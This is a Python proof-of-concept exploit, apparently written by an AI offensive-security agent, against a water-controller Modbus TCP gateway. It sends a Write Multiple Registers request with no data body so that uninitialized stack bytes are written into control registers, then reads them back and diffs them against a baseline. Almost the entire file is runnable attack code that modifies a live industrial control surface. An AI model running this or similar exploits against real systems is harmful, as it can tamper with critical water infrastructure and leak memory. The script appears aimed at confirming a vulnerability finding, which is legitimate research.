#!/usr/bin/env python3
"""
PoC for VULN_FINDING_B - Modbus FC 0x10 partial-body uninit stack read

Target: water-controller Modbus TCP gateway, port 1502
Bug:    handle_server_request() / FC 0x10 (Write Multiple Registers) reads
        request->data[5 + i*2] for i in [0..quantity) WITHOUT verifying that
        the body actually carried 5 + 2*quantity bytes. The byte_count field
        (offset 4 of the PDU body) is ignored.

Effect: stack memory beyond the wire bytes is interpreted as register values
        and written via write_register_value(). This is:
          - CWE-457 (read of uninitialized memory)
          - CWE-787 (out-of-bounds-influence write to control surface)

Step 1: send a "skeleton" PDU - FC 0x10, start=0, qty=N, but NO data body.
Step 2: read the same range back with FC 0x03 to observe the leaked stack
        bytes that were written into mapped registers.
Step 3: dump original baseline first so we can show the delta.

Author: offensive-security agent, vuln-hunt continuation pass, 2026-04-08
"""

import socket
import struct
import sys
import time

TARGET = ("192.168.6.13", 1502)
UNIT_ID = 1
START_ADDR = 0x0000
QUANTITY = 1  # smallest meaningful trigger - one register = 2 bytes of leaked stack
RECV_TIMEOUT = 30.0  # write_register_value() may block on PROFINET path


def build_mbap(trans_id: int, length: int, unit_id: int = UNIT_ID) -> bytes:
    return struct.pack(">HHHB", trans_id, 0, length, unit_id)


def send_recv(sock: socket.socket, payload: bytes) -> bytes:
    sock.sendall(payload)
    # MBAP header is 7 bytes, we'll read up to 512.
    return sock.recv(512)


def fc03_read(sock: socket.socket, trans_id: int, start: int, qty: int) -> bytes:
    pdu = struct.pack(">BHH", 0x03, start, qty)
    mbap = build_mbap(trans_id, 1 + len(pdu))  # length = unit + pdu
    return send_recv(sock, mbap + pdu)


def fc10_partial(sock: socket.socket, trans_id: int, start: int, qty: int) -> bytes:
    """The bug: send FC 0x10 header with NO byte_count and NO register payload.

    PDU layout for a normal FC 0x10:
        FC(1) | start(2) | qty(2) | byte_count(1) | data(qty*2)
    We send only:
        FC(1) | start(2) | qty(2)
    Length field in MBAP says "1 (unit) + 5 (FC+start+qty) = 6".
    """
    pdu = struct.pack(">BHH", 0x10, start, qty)
    mbap = build_mbap(trans_id, 1 + len(pdu))
    return send_recv(sock, mbap + pdu)


def parse_fc03_response(resp: bytes) -> list[int]:
    """Decode an FC 0x03 read-holding-registers response into a list of u16."""
    if len(resp) < 9:
        return []
    # MBAP(7) + FC(1) + byte_count(1) + data
    fc = resp[7]
    if fc != 0x03:
        return []
    byte_count = resp[8]
    data = resp[9:9 + byte_count]
    return list(struct.unpack(f">{byte_count // 2}H", data))


def main() -> int:
    print(f"[*] Target: {TARGET[0]}:{TARGET[1]}")
    print(f"[*] Unit ID: {UNIT_ID}, start: {START_ADDR}, quantity: {QUANTITY}")
    print()

    # ----- PHASE 1 — baseline read -----
    print("[*] Phase 1: baseline FC 0x03 read of target register window")
    s = socket.create_connection(TARGET, timeout=RECV_TIMEOUT)
    resp = fc03_read(s, 0x0001, START_ADDR, QUANTITY)
    print(f"    raw:  {resp.hex()}")
    baseline = parse_fc03_response(resp)
    if not baseline:
        print(f"    [!] FC 0x03 read failed or returned exception. Raw: {resp.hex()}")
        # Carry on - the bug might still trigger.
        baseline = [0] * QUANTITY
    else:
        print(f"    decoded baseline (first 16): {baseline[:16]}")
    s.close()
    print()

    # ----- PHASE 2 — trigger the bug -----
    print("[*] Phase 2: send FC 0x10 with QUANTITY but ZERO body bytes (the bug)")
    s = socket.create_connection(TARGET, timeout=RECV_TIMEOUT)
    resp = fc10_partial(s, 0x0002, START_ADDR, QUANTITY)
    print(f"    raw:  {resp.hex()}")
    if len(resp) >= 8:
        fc = resp[7]
        if fc & 0x80:
            ec = resp[8] if len(resp) > 8 else None
            print(f"    [+] EXCEPTION response: FC=0x{fc:02x}, code=0x{ec:02x}")
            print( "        => the controller rejected the request; bug is NOT reachable on the wire path")
        else:
            # Normal FC 0x10 response: FC, start_addr, qty
            if len(resp) >= 12:
                _, start_echo, qty_echo = struct.unpack(">BHH", resp[7:12])
                print(f"    [+] SUCCESS response: FC=0x{fc:02x}, start=0x{start_echo:04x}, qty={qty_echo}")
                print( "        => controller accepted the partial body and wrote QUANTITY registers")
                print( "        => uninitialized stack data was used as register values")
            else:
                print(f"    [?] short response: {resp.hex()}")
    else:
        print(f"    [!] very short response: {resp.hex()}")
    s.close()
    time.sleep(0.5)
    print()

    # ----- PHASE 3 — read back, observe leaked stack -----
    print("[*] Phase 3: read back the same window with FC 0x03 to see leaked bytes")
    s = socket.create_connection(TARGET, timeout=RECV_TIMEOUT)
    resp = fc03_read(s, 0x0003, START_ADDR, QUANTITY)
    print(f"    raw:  {resp.hex()}")
    after = parse_fc03_response(resp)
    if after:
        print(f"    decoded after-attack (first 16): {after[:16]}")
    s.close()
    print()

    # ----- PHASE 4 — diff -----
    print("[*] Phase 4: diff baseline vs after-attack")
    if baseline and after and len(baseline) == len(after):
        changed = [(i, b, a) for i, (b, a) in enumerate(zip(baseline, after)) if b != a]
        print(f"    {len(changed)} of {QUANTITY} registers were modified")
        if changed:
            print("    first 16 deltas:")
            for i, b, a in changed[:16]:
                ascii_repr = ""
                hi, lo = (a >> 8) & 0xff, a & 0xff
                for c in (hi, lo):
                    ascii_repr += chr(c) if 32 <= c < 127 else "."
                print(f"      reg[{i:3d}]: 0x{b:04x} -> 0x{a:04x}  ({ascii_repr})")
    else:
        print("    (cannot compute diff: baseline or after-attack read failed)")
    print()

    print("[*] PoC complete.")
    print("    If Phase 2 reported SUCCESS and Phase 4 shows non-zero deltas,")
    print("    the FC 0x10 partial-body bug is CONFIRMED.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
